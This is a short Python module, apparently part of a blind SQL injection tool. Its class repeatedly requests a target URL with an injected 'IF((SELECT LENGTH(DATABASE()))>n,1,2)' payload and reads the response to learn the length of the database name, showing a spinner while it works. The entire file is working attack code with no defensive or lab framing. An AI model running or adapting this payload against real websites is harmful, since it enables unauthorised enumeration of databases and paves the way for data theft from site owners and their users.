import threading
import time
import itertools
import requests


class DatabaseLengthChecker:
    def __init__(self, url, pre_payload):
        self.url = url
        self.pre_payload = pre_payload
        self.stop_spinner = False  # Flag to stop the spinner thread

    def get_database_length(self):
        length = 1
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        while True:
            # Construct the SQL Injection payload
            payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT LENGTH(DATABASE()))>{length},1,2)-- -"

            try:
                response = requests.get(payload)

                if response.text == '1':
                    length += 1
                else:
                    break
            except Exception as e:
                print(f"Error while testing: {e}")
                self.stop_spinner = True  # Signal to stop the spinner
                spinner_thread.join(timeout=0.1)
                return None

        self.stop_spinner = True  # Signal to stop the spinner
        spinner_thread.join()  # Ensure the spinner thread terminates

        print('\rDone!              ')
        return length

    def spinner(self):
        """Show a simple spinner."""
        for spin in itertools.cycle('/-\\|'):
            if self.stop_spinner:  # Check if the spinner should stop
                break
            print(f'\r{spin}', end='', flush=True)
            time.sleep(0.2)
